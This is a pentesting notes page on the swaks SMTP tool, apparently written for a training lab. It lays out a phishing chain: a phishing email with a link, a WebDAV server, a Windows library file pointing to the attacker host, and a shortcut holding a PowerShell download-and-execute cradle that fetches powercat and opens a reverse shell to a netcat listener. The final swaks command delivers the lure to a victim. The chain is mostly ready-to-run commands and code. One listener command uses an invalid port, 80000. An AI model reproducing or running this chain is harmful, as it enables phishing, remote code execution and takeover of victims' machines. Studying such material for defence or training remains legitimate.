---
title: swaks
author: amandaguglieri
TableOfContents: true
draft: false
tags:
  - pentesting
  - tools
  - SMTP
  - server
---
# Swaks

Swaks - Swiss Army Knife SMTP, the all-purpose SMTP transaction tester.     Swaks' primary design goal is to be a flexible, scriptable, transaction-oriented SMTP test tool.  It handles SMTP features and extensions such as TLS, authentication, and pipelining; multiple version of the SMTP protocol including SMTP, ESMTP, and LMTP; and multiple transport methods including UNIX-domain sockets, internet-domain sockets, and pipes to spawned processes.  Options can be specified in environment variables, configuration files, and the command line allowing maximum configurability and ease of use for operators and scripters.

## Basic commands

Next, we can use any mail client to connect to the mail server and send our email.

```shell-session
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $ipSMTPServerVictim
```


Another example:

```
sudo swaks -t daniela@beyond.com --from johnt@beyond.com -ap --attach @config.Library-ms --server 192.168.174.199 --body test.txt --header "Subject: Urgent Configuration Setup" --suppress-data
```

We attach the file config.Library-ms and as a body we send the test.txt. The victim IP 192.168.174.199 . 

For this attack to succeed, I will include the steps referenced in [Abusing Windows User interactions](user-interaction-windows.md).


### Step 1: Set up a webdav server

[See webdav](webdav-wsgidav.md)

Create a folder to serve from there:

```bash
mkdir /home/kali/webdav

cd /home/kali/webdav

wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/webdav --auth=anonymous 
```



### Step 2: Create a config.Library-ms 

Open Visual Studio and create an empty file named config.Library-ms .

Enter the following content for the file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.184</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Opening this microsoft library in a Windows, it will open a explorer windows connected to our share.

If we re-open our file in Visual Studio Code, we find that a new tag appeared named [serialized](https://docs.microsoft.com/en-us/windows/win32/search/search-schema-sconn-simplelocation).  The tag contains base64-encoded information about the location of the url  tag. Additionally, the content inside the  url  tags has changed from http://192.168.45.184  to \\192.168.45.184\DavWWWRoot. Windows tries to optimize the WebDAV connection information for the [Windows WebDAV client](https://www.webdavsystem.com/server/access/windows) and therefore modifies it.



### Step 3: Create a malicious shortcut

The shortcut will contain the following command:

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.184:8000/powercat.ps1'); powercat -c 192.168.45.184 -p 4444 -e powershell"

```

Right click in the Windows Desktop and select Create New Shortcut. Place the command in the Location of the item:

![[mslibrary.png]]


Give it a name: 

![[mslibrary2.png]]

### Step 4: Transfer the config.Library-ms and the malicious shortcut to your webdav server

Use whatever technique for file transfer the malicious files  config.Library-ms  and malicious.lnk to your kali, where the webdav server is in use. A convenient way is copying-pasting in the webdav share the two files.

We now have a our web dav server with both files.

### Step 5: Prepare the setup

**On one side**, we have the malicious.lnk downloading powercat.ps1 from our kali:8000 and then we have the same file launching the execution of a reverse shell:

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.184:8000/powercat.ps1'); powercat -c 192.168.45.184 -p 4444 -e powershell"
```

So we need, a http listener in port 8000 serving powercat.ps1:

```
python -m http.server 80000
```

A netcat listener ready to receive a  connection in port 4444:

```bash
nc -lnvp 4444
```


### Step 6: Deliver the malicious windows library file to the victim


```
sudo swaks -t jim@relia.com --from mark@relia.com -ap --attach @config.Library-ms --server 192.168.192.189 --body test.txt --header "Subject: Urgent Configuration Setup" --suppress-data
```



